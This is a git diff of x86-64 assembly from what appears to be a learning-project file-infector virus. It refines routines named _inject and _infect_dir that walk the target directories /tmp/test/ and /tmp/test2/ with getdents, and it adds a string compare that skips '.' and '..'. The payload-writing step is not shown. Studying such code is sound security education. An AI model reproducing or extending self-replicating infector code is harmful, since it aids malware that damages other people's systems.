@@ -15,7 +15,7 @@ section.text:
 ;and
 ;xor x, x => 3 bytes (put 0 into x)
 
-; function parameters are always (rdi, rsi, rdx) in this specific order
+; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
 ; (make sense with syscall)
 
 _start:
@@ -27,15 +27,16 @@ newline db `\n`, 0x0
 
 _ft_strlen:; (string rdi) - use rcx, rsi
 	xor rcx, rcx; = 0
-	.count_char:
+	.loop_char:
 		cmp byte [rdi + rcx], 0
 		jz .return
 		inc rcx
-		jmp .count_char
+		jmp .loop_char
 	.return:
 ret
 
-_print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, r15(temp)
+_print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, rbx(temp)
+	push rbx
 	call _ft_strlen
 	push rdi; mov rsi, rdi
 	pop rsi
@@ -48,18 +49,35 @@ _print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, r15(temp)
 	syscall
 
 	push rsi
-	pop r15
+	pop rbx
 	lea rsi, [rel newline]
 	push 1
 	pop rax; write
 	push 1
 	pop rdx
 	syscall
-	push r15
+	push rbx
 	pop rdi
+	pop rbx
 ret
 
 %endif; ========================================================================
+
+dotdir db `.`, 0x0, `..`, 0x0, 0x0
+
+_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax, rdx
+	xor rcx, rcx; = 0
+	.loop_char:
+		mov al, [rdi + rcx]
+		cmp al, [rsi + rcx]
+		jne .return
+		cmp al, 0
+		je .return
+		inc rcx
+	jmp .loop_char
+	.return:
+		sub al, [rsi + rcx]
+ret
 
 _inject:
 	pop rdi; pop addr from stack
@@ -74,17 +92,17 @@ _inject:
 
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
-	.loop_dir:
+	.loop_array_string:
 		add rdi, rcx
 		call _infect_dir
 		xor rcx, rcx; = 0
-		.next_dir:; seek next dir
+		.next_string:; seek next dir
 			inc rcx
 			cmp byte[rdi + rcx], 0x0
-			jnz .next_dir
+			jnz .next_string
 		inc rcx
 		cmp byte[rdi + rcx], 0x0
-		jnz .loop_dir
+		jnz .loop_array_string
 
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -107,16 +125,17 @@ _infect_dir:; (string rdi)
 	push rdi
 	pop r10; path
 	push rax
-	pop rdi; fd
-	mov r11, rdi; save fd
+	pop r13; fd
 
 	.getdents:
+		mov rdi, r13
 		push 78
 		pop rax; getdents
 		push 1024
 		pop rdx; size of buffer
 		mov rsi, rsp; buffer
 		syscall
+		push r12
 		push rsi
 		pop r12
 		cmp rax, 0x0
@@ -132,23 +151,43 @@ _infect_dir:; (string rdi)
 		add rdi, rcx; r12 => linux_dir
 		; if not . .. +18
 		add rdi, 18; linux_dir->d_name
-		%ifdef DEBUG
-			push rsi
-			push rdx
+		
+		push rcx
+		lea rsi, [rel dotdir]
+		xor rcx, rcx; = 0
+		.loop_array_string:
+			add rsi, rcx
 			push rcx
-			call _print; _print(rdi)
-			pop rcx
+			push rdx
+			call _ft_strcmp
 			pop rdx
-			pop rsi
-		%endif
+			pop rcx
+			cmp rax, 0
+			je .next_dir
+			xor rcx, rcx; = 0
+			.next_string:; seek next dir
+				inc rcx
+				cmp byte[rsi + rcx], 0x0
+				jnz .next_string
+			inc rcx
+			cmp byte[rsi + rcx], 0x0
+			jnz .loop_array_string
 
-		mov rsi, r12
-		add rsi, rcx
-		push rdi
-		movzx edi, word [rsi + 16]; linux_dir->d_reclen
-		add rcx, rdi
-		pop rdi
-		jmp .loop_in_dir
+		%ifdef DEBUG
+			push rdx
+			call _print; _print(rdi)
+			pop rdx
+		%endif
+		pop rcx
+
+		.next_dir:
+			mov rsi, r12
+			add rsi, rcx
+			push rdi
+			movzx edi, word [rsi + 16]; linux_dir->d_reclen
+			add rcx, rdi
+			pop rdi
+			jmp .loop_in_dir
 
 	.close:
 		push 3
@@ -162,6 +201,7 @@ _infect_dir:; (string rdi)
 		add rsp, 1024
 		push rdi
 		pop rsi
+		pop r12
 ret
 
 _host:
@@ -183,7 +223,7 @@ _exit:
 	pop r15
 
 	mov rax, 60 ; exit
-	mov rdi, 0
+	xor rdi, rdi; = 0
 	syscall
 
 directories db `/tmp/test/`, 0x0, `/tmp/test2/`, 0x0, 0x0
